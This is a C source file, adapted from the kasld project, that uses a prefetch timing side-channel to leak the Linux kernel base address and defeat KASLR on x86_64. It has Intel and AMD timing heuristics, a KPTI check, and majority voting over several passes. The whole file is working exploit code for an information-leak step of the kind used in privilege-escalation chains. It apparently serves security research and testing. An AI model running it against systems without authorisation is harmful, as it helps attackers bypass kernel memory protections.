// adapted from https://github.com/bcoles/kasld
//
// References:
//   https://gruss.cc/files/prefetch.pdf
//   https://github.com/IAIK/prefetch
//   https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/gruss

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "prefetch.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int verbose = 0;

#define STEP KERNEL_ALIGN
#define NUM_SLOTS ((KERNEL_BASE_MAX - KERNEL_BASE_MIN) / STEP)
#define ITERATIONS 64
#define WARMUP 3

static void collect_timings(uint64_t *times) {
  unsigned long idx;
  int i;

  for (idx = 0; idx < NUM_SLOTS; idx++)
    times[idx] = ~(uint64_t)0;

  for (i = 0; i < WARMUP + ITERATIONS; i++) {
    for (idx = 0; idx < NUM_SLOTS; idx++) {
      uint64_t target = KERNEL_BASE_MIN + idx * STEP;
      uint64_t t = time_prefetch(target);

      if (i >= WARMUP && t < times[idx])
        times[idx] = t;
    }
  }
}

static void collect_timings_amd(uint64_t *times) {
  unsigned long idx;
  int i;

  for (idx = 0; idx < NUM_SLOTS; idx++)
    times[idx] = 0;

  for (i = 0; i < WARMUP; i++)
    for (idx = 0; idx < NUM_SLOTS; idx++)
      time_prefetch(KERNEL_BASE_MIN + idx * STEP);

  for (i = 0; i < ITERATIONS; i++)
    for (idx = 0; idx < NUM_SLOTS; idx++)
      times[idx] += time_prefetch(KERNEL_BASE_MIN + idx * STEP);
}

static void dump_timings(const uint64_t *times, const char *stat) {
  unsigned long idx;
  fprintf(stderr, "[*] slot addr %s\n", stat);
  for (idx = 0; idx < NUM_SLOTS; idx++) {
    fprintf(stderr, "[*] %3lu 0x%lx %lu\n", idx,
            (unsigned long)(KERNEL_BASE_MIN + idx * STEP),
            (unsigned long)times[idx]);
  }
}

static unsigned long find_base_intel(const uint64_t *times) {
  uint64_t min_time = ~(uint64_t)0;
  unsigned long best = 0;
  unsigned long idx;

  for (idx = 0; idx < NUM_SLOTS; idx++) {
    if (times[idx] < min_time) {
      min_time = times[idx];
      best = idx;
    }
  }

  return KERNEL_BASE_MIN + best * STEP;
}

#define CONFIRM_K 5
#define CONFIRM_M 8

static int cmp_u64(const void *a, const void *b) {
  uint64_t va = *(const uint64_t *)a;
  uint64_t vb = *(const uint64_t *)b;
  return (va > vb) - (va < vb);
}

static unsigned long find_base_amd(const uint64_t *times) {
  uint64_t sorted[NUM_SLOTS];
  unsigned long idx;

  memcpy(sorted, times, sizeof(sorted));
  qsort(sorted, NUM_SLOTS, sizeof(uint64_t), cmp_u64);

  uint64_t median = sorted[NUM_SLOTS / 2];
  uint64_t threshold = median + median / 2;

  if (verbose)
    fprintf(stderr, "[*] AMD threshold: %lu (median=%lu)\n",
            (unsigned long)threshold, (unsigned long)median);

  for (idx = 0; idx + CONFIRM_M <= NUM_SLOTS; idx++) {
    /* Prevent the confirmation window from starting before the boundary. */
    if (times[idx] <= threshold)
      continue;
    int count = 0;
    unsigned long j;
    for (j = 0; j < CONFIRM_M; j++) {
      if (times[idx + j] > threshold)
        count++;
    }
    if (count >= CONFIRM_K)
      return KERNEL_BASE_MIN + idx * STEP;
  }

  return 0;
}

#define NUM_PASSES 7

static unsigned long majority_vote(int cpu_vendor) {
  unsigned long results[NUM_PASSES];
  uint64_t times[NUM_SLOTS];
  int i;

  for (i = 0; i < NUM_PASSES; i++) {
    if (cpu_vendor == CPU_VENDOR_AMD)
      collect_timings_amd(times);
    else
      collect_timings(times);

    if (verbose && i == 0)
      dump_timings(times,
                   cpu_vendor == CPU_VENDOR_AMD ? "sum_cycles" : "min_cycles");

    if (cpu_vendor == CPU_VENDOR_AMD)
      results[i] = find_base_amd(times);
    else
      results[i] = find_base_intel(times);

    if (verbose)
      fprintf(stderr, "[*] pass %d: 0x%lx\n", i, results[i]);
  }

  /* Boyer-Moore majority vote. */
  unsigned long candidate = 0;
  int count = 0;

  for (i = 0; i < NUM_PASSES; i++) {
    if (count == 0) {
      candidate = results[i];
      count = 1;
    } else if (results[i] == candidate) {
      count++;
    } else {
      count--;
    }
  }

  /* Verify the candidate actually has majority. */
  count = 0;
  for (i = 0; i < NUM_PASSES; i++) {
    if (results[i] == candidate)
      count++;
  }

  if (count > NUM_PASSES / 2)
    return candidate;

  return 0;
}

unsigned long get_kernel_addr_prefetch(void) {
  int cpu = detect_cpu_vendor();
  bool pti = detect_kpti();

  if (cpu == CPU_VENDOR_UNKNOWN)
    printf("[*] unknown CPU vendor, assuming Intel-like behavior\n");
  else
    printf("[*] %s CPU detected\n", cpu == CPU_VENDOR_AMD ? "AMD" : "Intel");

  if (!has_rdtscp()) {
    fprintf(stderr, "[-] rdtscp instruction not supported on this CPU\n");
    return 0;
  }

  if (pti) {
    fprintf(stderr,
            "[-] KPTI is enabled; prefetch side-channel is ineffective\n"
            "    (kernel pages unmapped from userspace page tables)\n");
    return 0;
  }

  printf("[*] KPTI is not detected\n");

  pin_cpu(0);

  unsigned long addr = majority_vote(cpu);

  if (!addr) {
    fprintf(stderr, "[-] majority vote failed across %d passes\n", NUM_PASSES);
    return 0;
  }

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main(int argc, char *argv[]) {
  if (argc > 1 && strcmp(argv[1], "-v") == 0)
    verbose = 1;

  printf("[*] trying prefetch side-channel ...\n");

  unsigned long addr = get_kernel_addr_prefetch();
  if (!addr) {
    printf("[-] prefetch side-channel failed (not exploitable?)\n");
    return 0;
  }

  printf("[+] possible kernel base: %lx\n", addr);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr,
               KASLD_REGION_KERNEL_TEXT, NULL);

  return 0;
}
